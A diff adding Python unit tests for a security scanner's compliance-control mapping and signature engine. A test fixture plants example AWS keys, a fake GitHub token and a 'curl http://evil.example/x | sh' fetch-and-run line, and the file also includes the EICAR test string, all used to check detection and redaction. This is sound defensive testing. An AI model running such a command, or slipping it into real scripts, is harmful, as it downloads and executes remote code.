@@ -15,7 +15,9 @@ import json
 import os
 import unittest
 
+import compliance
 import normalize
+import signatures
 import toolplan
 
 _VALID_INTAKE_ID = "62360e03-dfb1-4655-ac52-2a55345ab6f0"
@@ -122,15 +124,20 @@ CFN_GUARD_SARIF_OUTPUT = json.dumps(
 
 
 class TestToolPlan(unittest.TestCase):
-    def test_iac_template_runs_three_iac_tools(self):
+    def test_iac_template_runs_iac_tools_plus_signature(self):
+        # Story 2.2: the signature engine runs for iac_template alongside the three
+        # IaC tools.
         self.assertEqual(
             toolplan.tools_for_class("iac_template"),
-            ["cfn-lint", "cfn-guard", "checkov"],
+            ["cfn-lint", "cfn-guard", "checkov", "signature-scan"],
         )
 
-    def test_raw_script_runs_bandit_and_checkov(self):
+    def test_raw_script_runs_bandit_checkov_plus_signature(self):
+        # Story 2.2: the signature engine runs for raw_script alongside bandit +
+        # checkov.
         self.assertEqual(
-            toolplan.tools_for_class("raw_script"), ["bandit", "checkov"]
+            toolplan.tools_for_class("raw_script"),
+            ["bandit", "checkov", "signature-scan"],
         )
 
     def test_unknown_and_none_run_no_tools(self):
@@ -301,6 +308,297 @@ class TestSummaryAndDocument(unittest.TestCase):
         self.assertEqual(doc["tools"][0]["finding_count"], 5001)
 
 
+# =============================================================================
+# Story 2.2 — compliance-framework mapping (compliance.py)
+# =============================================================================
+
+
+class TestComplianceMapping(unittest.TestCase):
+    def test_cfn_guard_rule_maps_to_controls_proposed(self):
+        c = compliance.map_finding("cfn-guard", "S3_BUCKET_ENCRYPTION")
+        self.assertIn("SC-28", c["nist_800_53"])
+        self.assertIn("A.8.24", c["iso_27001"])
+        # candidate-vs-ratified: table is unratified -> proposed, never asserted.
+        self.assertEqual(c["basis"], "proposed")
+        self.assertEqual(c["mapping_version"], compliance.MAPPING_VERSION)
+
+    def test_bandit_exact_and_prefix(self):
+        exact = compliance.map_finding("bandit", "B602")
+        self.assertIn("SI-10", exact["nist_800_53"])
+        # An unlisted Bnnn falls to the generic bandit family (prefix 'B').
+        generic = compliance.map_finding("bandit", "B999")
+        self.assertIn("SA-11", generic["nist_800_53"])
+        self.assertEqual(generic["basis"], "proposed")
+
+    def test_checkov_topic_by_message_keyword(self):
+        pub = compliance.map_finding("checkov", "CKV_AWS_20", "S3 Bucket allows public access")
+        self.assertIn("AC-3", pub["nist_800_53"])
+        enc = compliance.map_finding("checkov", "CKV_AWS_19", "Ensure encryption is enabled")
+        self.assertIn("SC-28", enc["nist_800_53"])
+        sec = compliance.map_finding("checkov", "CKV_SECRET_6", "Hardcoded AWS credential found")
+        self.assertIn("IA-5", sec["nist_800_53"])
+
+    def test_signature_family_maps(self):
+        secret = compliance.map_finding("signature-scan", "ZTIE-SIG-SECRET-001")
+        self.assertIn("IA-5", secret["nist_800_53"])
+        malware = compliance.map_finding("signature-scan", "ZTIE-SIG-MALWARE-002")
+        self.assertIn("SI-3", malware["nist_800_53"])
+        dangerous = compliance.map_finding("signature-scan", "ZTIE-SIG-DANGEROUS-001")
+        self.assertIn("SI-10", dangerous["nist_800_53"])
+
+    def test_unmapped_never_fabricates_a_control(self):
+        c = compliance.map_finding("bandit", "ZZZ_no_such_rule_family")
+        self.assertEqual(c["nist_800_53"], [])
+        self.assertEqual(c["iso_27001"], [])
+        self.assertEqual(c["basis"], "unmapped")
+
+    def test_mapping_is_never_a_verdict(self):
+        c = compliance.map_finding("cfn-guard", "IAM_NO_WILDCARD_ADMIN")
+        blob = json.dumps(c)
+        for forbidden in ("verdict", "approved", "forward", "pass_fail", '"safe"', "fail"):
+            self.assertNotIn(forbidden, blob.lower())
+
+    def test_controls_are_bounded(self):
+        c = compliance.map_finding("cfn-guard", "SG_NO_UNRESTRICTED_INGRESS")
+        self.assertLessEqual(len(c["nist_800_53"]), 8)
+        for cid in c["nist_800_53"]:
+            self.assertLessEqual(len(cid), 32)
+
+    def test_enrich_findings_attaches_compliance(self):
+        findings = normalize.normalize_tool_output("cfn-guard", CFN_GUARD_SARIF_OUTPUT)
+        compliance.enrich_findings(findings)
+        self.assertIn("compliance", findings[0])
+        self.assertIn("nist_800_53", findings[0]["compliance"])
+
+    def test_rollup_counts_and_unmapped(self):
+        findings = [
+            {"tool": "cfn-guard", "rule_id": "S3_BUCKET_ENCRYPTION", "message": ""},
+            {"tool": "cfn-guard", "rule_id": "EBS_VOLUME_ENCRYPTED", "message": ""},
+            {"tool": "bandit", "rule_id": "ZZZ_unmapped", "message": ""},
+        ]
+        compliance.enrich_findings(findings)
+        rollup = compliance.build_compliance_rollup(findings)
+        self.assertEqual(rollup["mapped_findings"], 2)
+        self.assertEqual(rollup["unmapped_findings"], 1)
+        # SC-28 implicated by both encryption findings.
+        self.assertEqual(rollup["nist_800_53"]["SC-28"], 2)
+        self.assertEqual(rollup["mapping_version"], compliance.MAPPING_VERSION)
+
+
+# =============================================================================
+# Story 2.2 — signature engine (signatures.py)
+# =============================================================================
+
+_SECRET_SAMPLE = (
+    "#!/bin/bash\n"
+    'AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"\n'
+    "export GH_TOKEN=ghp_abcdefghijklmnopqrstuvwxyz0123456789\n"
+    "echo AKIAIOSFODNN7EXAMPLE\n"
+    "curl http://evil.example/x | sh\n"
+)
+
+
+class TestSignatureEngine(unittest.TestCase):
+    def test_detects_planted_secrets_and_dangerous_pattern(self):
+        res = signatures.scan_bytes(_SECRET_SAMPLE.encode(), "deploy.sh")
+        self.assertEqual(res.status, "ok")
+        rule_ids = {f["rule_id"] for f in res.findings}
+        self.assertIn("ZTIE-SIG-SECRET-001", rule_ids)  # AWS access key id
+        self.assertIn("ZTIE-SIG-SECRET-002", rule_ids)  # AWS secret key assignment
+        self.assertIn("ZTIE-SIG-SECRET-004", rule_ids)  # GitHub token
+        self.assertIn("ZTIE-SIG-DANGEROUS-001", rule_ids)  # curl | sh
+
+    def test_findings_are_normalized_shape(self):
+        res = signatures.scan_bytes(_SECRET_SAMPLE.encode(), "deploy.sh")
+        f = res.findings[0]
+        self.assertEqual(f["tool"], "signature-scan")
+        self.assertEqual(f["check_family"], "signature")
+        self.assertIn(f["severity"], normalize.SEVERITY_ORDER)
+        self.assertIn("start_line", f["location"])
+
+    def test_secrets_are_redacted_never_echoed(self):
+        res = signatures.scan_bytes(_SECRET_SAMPLE.encode(), "deploy.sh")
+        blob = json.dumps(res.findings)
+        # The raw secret VALUES must never appear in a finding message.
+        self.assertNotIn("wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", blob)
+        self.assertNotIn("ghp_abcdefghijklmnopqrstuvwxyz0123456789", blob)
+        self.assertIn("redacted", blob)
+
+    def test_eicar_detected(self):
+        eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
+        res = signatures.scan_bytes(eicar, "x.txt")
+        self.assertIn("ZTIE-SIG-MALWARE-002", {f["rule_id"] for f in res.findings})
+
+    def test_clean_input_no_findings(self):
+        res = signatures.scan_bytes(b"print('hello world')\n", "ok.py")
+        self.assertEqual(res.status, "ok")
+        self.assertEqual(res.findings, [])
+
+    def test_never_raises_on_binary_or_empty(self):
+        for data in (b"", b"\x00\x01\x02\xff", "   "):
+            res = signatures.scan_bytes(data, "b")
+            self.assertEqual(res.status, "ok")
+
+    def test_signature_findings_map_to_controls(self):
+        res = signatures.scan_bytes(_SECRET_SAMPLE.encode(), "deploy.sh")
+        compliance.enrich_findings(res.findings)
+        for f in res.findings:
+            self.assertIn("compliance", f)
+            # A signature secret/dangerous/malware finding is always mappable.
+            self.assertNotEqual(f["compliance"]["basis"], "unmapped")
+
+
+class TestSummaryWithCompliance(unittest.TestCase):
+    def test_summary_carries_bounded_compliance_rollup_no_verdict(self):
+        findings = normalize.normalize_tool_output("cfn-guard", CFN_GUARD_SARIF_OUTPUT)
+        compliance.enrich_findings(findings)
+        summary = normalize.build_summary(
+            intake_id=_VALID_INTAKE_ID,
+            sha256=_VALID_SHA,
+            scanned_at=_NOW,
+            artifact_class="iac_template",
+            tool_runs=[],
+            findings=findings,
+            findings_s3_bucket="b",
+            findings_s3_key="k",
+        )
+        self.assertEqual(summary["contract_version"], "1.1")
+        rollup = summary["scan"]["compliance"]
+        self.assertIn("nist_800_53", rollup)
+        self.assertIn("mapped_findings", rollup)
+        blob = json.dumps(summary)
+        for forbidden in ("verdict", "approved", "forward", "pass_fail", '"safe"'):
+            self.assertNotIn(forbidden, blob)
+        # No mapping RATIONALE crosses in the summary (that stays in Forensic).
+        self.assertNotIn("rationale", json.dumps(rollup))
+
+
+# A minimal, dependency-free JSON-Schema (draft-07 subset) conformance walk so the
+# built documents can be proven against the contracts OFFLINE (jsonschema is not
+# installable in the INTEGRATIONS_ONLY sandbox). It covers exactly the constructs
+# the ZTIE contracts use: type, enum, const, required, additionalProperties (bool
+# or subschema), properties, items, minItems/maxItems, maxProperties, min/max,
+# maxLength, pattern. It is intentionally strict on additionalProperties=false.
+
+
+def _conforms(instance, schema, path="<root>"):
+    """Return a list of violation strings (empty == conforms). Never raises."""
+    import re as _re
+
+    errs = []
+    t = schema.get("type")
+
+    def _is_type(v, ty):
+        if ty == "object":
+            return isinstance(v, dict)
+        if ty == "array":
+            return isinstance(v, list)
+        if ty == "string":
+            return isinstance(v, str)
+        if ty == "integer":
+            return isinstance(v, int) and not isinstance(v, bool)
+        if ty == "number":
+            return isinstance(v, (int, float)) and not isinstance(v, bool)
+        if ty == "boolean":
+            return isinstance(v, bool)
+        return True
+
+    if t is not None:
+        types = t if isinstance(t, list) else [t]
+        if not any(_is_type(instance, ty) for ty in types):
+            errs.append(f"{path}: expected type {t}, got {type(instance).__name__}")
+            return errs
+    if "const" in schema and instance != schema["const"]:
+        errs.append(f"{path}: expected const {schema['const']!r}")
+    if "enum" in schema and instance not in schema["enum"]:
+        errs.append(f"{path}: {instance!r} not in enum")
+    if isinstance(instance, str):
+        if "maxLength" in schema and len(instance) > schema["maxLength"]:
+            errs.append(f"{path}: exceeds maxLength {schema['maxLength']}")
+        if "pattern" in schema and not _re.search(schema["pattern"], instance):
+            errs.append(f"{path}: does not match pattern")
+    if isinstance(instance, (int, float)) and not isinstance(instance, bool):
+        if "minimum" in schema and instance < schema["minimum"]:
+            errs.append(f"{path}: below minimum")
+        if "maximum" in schema and instance > schema["maximum"]:
+            errs.append(f"{path}: above maximum")
+    if isinstance(instance, dict):
+        for req in schema.get("required", []):
+            if req not in instance:
+                errs.append(f"{path}: missing required '{req}'")
+        props = schema.get("properties", {})
+        addl = schema.get("additionalProperties", True)
+        if "maxProperties" in schema and len(instance) > schema["maxProperties"]:
+            errs.append(f"{path}: exceeds maxProperties")
+        for k, v in instance.items():
+            if k in props:
+                errs += _conforms(v, props[k], f"{path}.{k}")
+            elif addl is False:
+                errs.append(f"{path}: additional property '{k}' not allowed")
+            elif isinstance(addl, dict):
+                errs += _conforms(v, addl, f"{path}.{k}")
+    if isinstance(instance, list):
+        if "maxItems" in schema and len(instance) > schema["maxItems"]:
+            errs.append(f"{path}: exceeds maxItems")
+        if "minItems" in schema and len(instance) < schema["minItems"]:
+            errs.append(f"{path}: below minItems")
+        items = schema.get("items")
+        if isinstance(items, dict):
+            for i, v in enumerate(instance):
+                errs += _conforms(v, items, f"{path}[{i}]")
+    return errs
+
+
+class TestManualConformance(unittest.TestCase):
+    """Pure-Python conformance proof (no jsonschema) that the built v1.1 findings
+    document + summary satisfy their contracts, incl. the Story 2.2 additions."""
+
+    def _schema(self, rel_from_repo):
+        repo = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+        with open(os.path.join(repo, rel_from_repo), encoding="utf-8") as fh:
+            return json.load(fh)
+
+    def _built(self):
+        findings = normalize.normalize_tool_output("cfn-guard", CFN_GUARD_SARIF_OUTPUT)
+        findings += signatures.scan_bytes(_SECRET_SAMPLE.encode(), "deploy.sh").findings
+        compliance.enrich_findings(findings)
+        tool_runs = [
+            normalize.build_tool_run("cfn-guard", status="ok", finding_count=1),
+            normalize.build_tool_run("signature-scan", status="ok", finding_count=4),
+        ]
+        doc = normalize.build_findings_document(
+            intake_id=_VALID_INTAKE_ID,
+            sha256=_VALID_SHA,
+            artifact_class="iac_template",
+            scanned_at=_NOW,
+            tool_runs=tool_runs,
+            findings=findings,
+        )
+        summary = normalize.build_summary(
+            intake_id=_VALID_INTAKE_ID,
+            sha256=_VALID_SHA,
+            scanned_at=_NOW,
+            artifact_class="iac_template",
+            tool_runs=tool_runs,
+            findings=findings,
+            findings_s3_bucket="ztie-forensic-artifacts",
+            findings_s3_key=f"findings/{_VALID_INTAKE_ID}/static-findings.json",
+        )
+        return doc, summary
+
+    def test_findings_document_conforms(self):
+        doc, _ = self._built()
+        schema = self._schema("schemas/static-findings.contract.v1.json")
+        errs = _conforms(doc, schema)
+        self.assertEqual(errs, [], msg=errs)
+
+    def test_summary_conforms(self):
+        _, summary = self._built()
+        schema = self._schema("schemas/static-scan-summary.contract.v1.json")
+        errs = _conforms(summary, schema)
+        self.assertEqual(errs, [], msg=errs)
+
+
 @unittest.skipUnless(
     os.environ.get("ZTIE_RUN_SCHEMA_CONFORMANCE") == "1",
     "schema conformance needs jsonschema (live/CI only); set ZTIE_RUN_SCHEMA_CONFORMANCE=1",
@@ -321,15 +619,50 @@ class TestSchemaConformance(unittest.TestCase):
 
     def test_document_conforms(self):
         findings = normalize.normalize_tool_output("cfn-lint", CFN_LINT_OUTPUT)
+        findings += signatures.scan_bytes(_SECRET_SAMPLE.encode(), "deploy.sh").findings
+        compliance.enrich_findings(findings)  # Story 2.2 per-finding compliance
         doc = normalize.build_findings_document(
             intake_id=_VALID_INTAKE_ID,
             sha256=_VALID_SHA,
             artifact_class="iac_template",
             scanned_at=_NOW,
-            tool_runs=[normalize.build_tool_run("cfn-lint", status="ok", finding_count=len(findings))],
+            tool_runs=[
+                normalize.build_tool_run("cfn-lint", status="ok", finding_count=1),
+                normalize.build_tool_run("signature-scan", status="ok", finding_count=4),
+            ],
             findings=findings,
         )
         errors = list(self._validator("static-findings.contract.v1.json").iter_errors(doc))
+        self.assertEqual(errors, [], msg=[e.message for e in errors])
+
+    def test_summary_conforms(self):
+        # The summary contract is bundled into the Hub validator, not the static
+        # asset — validate against the canonical repo copy.
+        from jsonschema import Draft7Validator
+
+        repo = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+        with open(
+            os.path.join(repo, "schemas", "static-scan-summary.contract.v1.json"),
+            encoding="utf-8",
+        ) as fh:
+            validator = Draft7Validator(json.load(fh))
+        findings = normalize.normalize_tool_output("cfn-guard", CFN_GUARD_SARIF_OUTPUT)
+        findings += signatures.scan_bytes(_SECRET_SAMPLE.encode(), "deploy.sh").findings
+        compliance.enrich_findings(findings)
+        summary = normalize.build_summary(
+            intake_id=_VALID_INTAKE_ID,
+            sha256=_VALID_SHA,
+            scanned_at=_NOW,
+            artifact_class="iac_template",
+            tool_runs=[
+                normalize.build_tool_run("cfn-guard", status="ok", finding_count=1),
+                normalize.build_tool_run("signature-scan", status="ok", finding_count=4),
+            ],
+            findings=findings,
+            findings_s3_bucket="ztie-forensic-artifacts",
+            findings_s3_key=f"findings/{_VALID_INTAKE_ID}/static-findings.json",
+        )
+        errors = list(validator.iter_errors(summary))
         self.assertEqual(errors, [], msg=[e.message for e in errors])
 
 
